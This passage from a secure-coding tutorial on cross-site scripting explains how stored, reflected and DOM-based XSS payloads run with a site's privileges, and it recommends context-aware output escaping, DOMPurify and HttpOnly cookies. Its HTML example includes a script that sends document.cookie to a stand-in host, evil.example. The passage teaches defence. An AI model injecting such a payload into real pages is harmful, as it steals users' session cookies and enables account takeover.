<Figure>

The attacker's script executes with your origin's privileges, in your victim's
browser, as your victim.

</Figure>

The mechanism is <Ref to="#3-the-boundary-between-data-and-code">section 3</Ref>'s again, with the browser as the parser:

```html
<!-- a comment field, rendered into the page -->
<div class="comment">Nice article!</div>

<!-- what somebody submitted instead -->
<div class="comment"><script>
  fetch('https://evil.example/?c=' + document.cookie)
</script></div>
```

Because it is served from <Peach>your</Peach> domain, that script inherits everything your
origin has:

| It can | Because |
|---|---|
| Read cookies without `HttpOnly` | It is same-origin |
| Read `localStorage`, always | <Peach>There is no flag that stops this</Peach> |
| Make authenticated requests as the victim | The browser attaches credentials |
| Rewrite the page | Fake login forms, changed payment details |
| Keylog | It is JavaScript on the page |

| Kind | Where the payload lives |
|---|---|
| <Peach>Stored</Peach> | In your database. Served to every viewer. Worst |
| <Peach>Reflected</Peach> | In a URL parameter echoed into the response. Needs a click |
| <Peach>DOM-based</Peach> | Never reaches your server. `innerHTML` from `location.hash` |

<DoThis>

Escape on output, by context

The critical word is <Peach>output</Peach>, not input. The same string is safe in one place
and dangerous in another, so escaping at the point of entry cannot be correct
for every destination.
- <Mint>Let your template engine escape by default</Mint> and treat every
  `dangerouslySetInnerHTML`, `v-html`, `\|safe` and `innerHTML` as a code review
  trigger.
- <Mint>Sanitise HTML with a real library</Mint> (DOMPurify) when you must accept rich
  text. Never with a regex.
- <Mint>Escape for the context</Mint>: HTML body, attribute, JavaScript string, URL and
  CSS all have different rules.
- <Mint>Set `HttpOnly`</Mint> so at least the session cookie is out of reach.

</DoThis>
